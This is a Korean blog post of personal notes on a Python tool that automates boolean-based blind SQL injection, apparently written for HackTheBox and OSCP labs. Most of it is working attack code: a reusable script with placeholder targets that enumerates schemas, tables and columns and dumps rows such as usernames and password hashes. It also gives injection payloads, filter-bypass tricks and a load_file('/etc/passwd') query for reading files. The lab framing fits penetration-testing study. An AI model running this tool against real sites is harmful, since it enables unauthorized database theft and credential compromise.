---
slug: "blind-sqli-script"
title: "Blind sqli script"
date: 2026-07-03
category: "웹 해킹"
tags: []
excerpt: "- 에러 메시지가 안 나오는 blind SQLi 상황 - 응답에 True/False를 구분할 수 있는 메시지가 있을 때 - sqlmap 못 쓰는 환경 (OSCP 시험 등)"
readingTime: 12
---

# Blind SQLi 자동화 스크립트 (Boolean-Based)

## 언제 쓰는가?

- 에러 메시지가 안 나오는 blind SQLi 상황
- 응답에 True/False를 구분할 수 있는 메시지가 있을 때
- sqlmap 못 쓰는 환경 (OSCP 시험 등)

---

## 매번 바꿔야 하는 부분

### 1. 타겟 URL

```python
r = s.get("http://usage.htb/forget-password")   # ← 바꾸기
...
response = s.post("http://usage.htb/forget-password", ...)  # ← 바꾸기
```

### 2. CSRF 토큰 추출 정규식

```python
token = re.search(r'name="_token" value="(.+?)"', r.text).group(1)
```

- Laravel: `name="_token" value="(.+?)"`
- 다른 프레임워크면 Burp에서 폼 소스 확인 후 수정

### 3. POST body 구성

```python
raw_body = f"_token={quote(token)}&email={quote(payload)}"
```

- 파라미터 이름(`email`) 타겟에 맞게 수정
- CSRF 토큰 없는 사이트면 `f"email={quote(payload)}"` 만 써도 됨

### 4. 헤더

```python
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://usage.htb',       # ← 바꾸기
    'Referer': 'http://usage.htb/forget-password'  # ← 바꾸기
}
```

### 5. True/False 판단 기준

```python
return "We have e-mailed your password reset link" in response.text
```

- Burp에서 True일 때 응답 vs False일 때 응답 비교해서 고유한 문자열 찾기
- 상태코드로 구분 가능하면: `return response.status_code == 200`

### 6. 페이로드 구조

```python
payload = f"' or (ascii(substring(({query}),{index},1)) > {mid}) -- -"
```

- `or` 대신 `AND` 가 맞는 경우도 있음 → Burp에서 `' AND 1=1 -- -` vs `' AND 1=2 -- -` 테스트
- `-- -` 대신 `AND '1'='1` 로 닫아야 하는 경우도 있음
- 공백 필터 있으면 `/**/` 로 대체

---

## 진단 순서 (안 될 때)

```python
# 1. 기본 True/False 되는지
print(blind_sqli("' or 1=1 -- -"))   # True
print(blind_sqli("' or 1=2 -- -"))   # False

# 2. subquery 되는지
print(blind_sqli("' or (select 1)=1 -- -"))

# 3. 함수 되는지
print(blind_sqli("' or ascii('A')=65 -- -"))
print(blind_sqli("' or substring('abc',1,1)='a' -- -"))

# 4. 조합 되는지
print(blind_sqli("' or ascii(substring(database(),1,1))>0 -- -"))
```

→ 어디서 False 나오는지 찾으면 원인 파악 가능

---

## 전체 코드

```python
import requests
import re
from urllib.parse import quote

def blind_sqli(payload):
    s = requests.Session()
    # ↓ URL 바꾸기
    r = s.get("http://TARGET/vulnerable-page")
    # ↓ 토큰 파싱 방식 바꾸기 (없으면 이 줄 삭제)
    token = re.search(r'name="_token" value="(.+?)"', r.text).group(1)

    # ↓ body 구성 바꾸기
    raw_body = f"_token={quote(token)}&email={quote(payload)}"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://TARGET',       # ← 바꾸기
        'Referer': 'http://TARGET/page'  # ← 바꾸기
    }
    response = s.post(
        "http://TARGET/vulnerable-page",  # ← 바꾸기
        data=raw_body,
        headers=headers,
        allow_redirects=True
    )
    # ↓ True/False 판단 기준 바꾸기
    return "성공 메시지" in response.text


def extract_string(query, max_len=100):
    result = ''
    for index in range(1, max_len + 1):
        low, high = 0, 127
        while low < high:
            mid = (low + high) // 2
            # ↓ 페이로드 구조 바꾸기
            payload = f"' or (ascii(substring(({query}),{index},1)) > {mid}) -- -"
            if blind_sqli(payload):
                low = mid + 1
            else:
                high = mid
        if low == 0:
            break
        result += chr(low)
        print(f"[+] [{index:02d}] {result}", flush=True)
    return result


def menu():
    while True:
        print("\n=============================")
        print("1. 현재 DB 확인")
        print("2. 스키마 목록 추출")
        print("3. 테이블 목록 추출")
        print("4. 컬럼 목록 추출")
        print("5. 데이터 추출 (row별)")
        print("0. 종료")
        print("=============================")
        choice = input("선택: ").strip()

        if choice == '1':
            db = extract_string("select database()")
            print(f"\n[+] DB = {db}")

        elif choice == '2':
            schemas = extract_string("select group_concat(schema_name) from information_schema.schemata")
            print(f"\n[+] schemas = {schemas}")

        elif choice == '3':
            schema = input("스키마 이름: ").strip()
            tables = extract_string(f"select group_concat(table_name) from information_schema.tables where table_schema='{schema}'")
            print(f"\n[+] tables = {tables}")

        elif choice == '4':
            table = input("테이블 이름: ").strip()
            columns = extract_string(f"select group_concat(column_name) from information_schema.columns where table_name='{table}'")
            print(f"\n[+] columns = {columns}")

        elif choice == '5':
            table = input("테이블 이름: ").strip()
            col = input("컬럼 이름 (여러개면 콤마로 구분, 예: username,password): ").strip()

            # 총 row 수 먼저 확인
            count_str = extract_string(f"select count(*) from {table}")
            if not count_str.isdigit():
                print(f"[!] row 수 확인 실패: {count_str}")
                continue
            count = int(count_str)
            print(f"\n[+] 총 {count}개 row\n")

            # row별로 추출 (여러 컬럼은 0x7c(|)로 구분)
            for i in range(count):
                query = f"select concat_ws(0x7c,{col}) from {table} limit {i},1"
                row = extract_string(query)
                print(f"[+] row[{i}] = {row}\n")

        elif choice == '0':
            print("종료")
            break

        else:
            print("잘못된 입력")


# ===== 실행 =====
print("[*] oracle 테스트")
print("  1=1:", blind_sqli("' or 1=1 -- -"))
print("  1=2:", blind_sqli("' or 1=2 -- -"))

menu()
```

---

## 데이터 추출 (5번) 동작 방식

- `count(*)` 로 총 row 수 먼저 확인
- `limit {i},1` 로 row 하나씩 순회
- `concat_ws(0x7c, col1, col2)` 로 여러 컬럼을 `|` 로 구분해서 한 번에 추출
    - 예: `admin|$2y$10$abcd...`
- `0x7c` 는 `|` 의 hex (따옴표 필터 우회용)

출력 예시:

```
[+] 총 2개 row
[+] row[0] = admin|$2y$10$hash1...
[+] row[1] = john|$2y$10$hash2...
```

---

## DB별 페이로드 차이

|DB|version|comment|
|---|---|---|
|MySQL|`@@version`|`-- -` 또는 `#`|
|PostgreSQL|`version()`|`--`|
|MSSQL|`@@version`|`--`|
|Oracle|`SELECT banner FROM v$version`|`--`|

## 자주 쓰는 쿼리

```sql
-- 현재 DB
select database()

-- 모든 스키마
select group_concat(schema_name) from information_schema.schemata

-- 특정 DB의 테이블
select group_concat(table_name) from information_schema.tables where table_schema='DB이름'

-- 특정 테이블의 컬럼
select group_concat(column_name) from information_schema.columns where table_name='테이블이름'

-- row별 데이터 추출
select concat_ws(0x7c,col1,col2) from 테이블명 limit 0,1

-- 현재 유저
select user()

-- 파일 읽기 (권한 있을 때)
select load_file('/etc/passwd')
```